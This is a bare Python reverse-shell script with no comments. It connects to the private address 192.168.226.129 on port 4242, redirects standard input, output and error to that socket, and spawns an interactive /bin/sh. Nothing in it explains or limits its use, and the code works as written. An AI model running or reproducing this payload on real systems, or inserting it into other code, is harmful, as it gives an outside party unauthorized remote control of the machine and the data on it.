import sys, socket, os, pty

def connectshell(ip):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,4242))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("/bin/sh")
        s.shutdown(socket.SHUT_RDWR)
        s.close()
    except Exception as e:
        return str(e)
    
connectshell('192.168.226.129')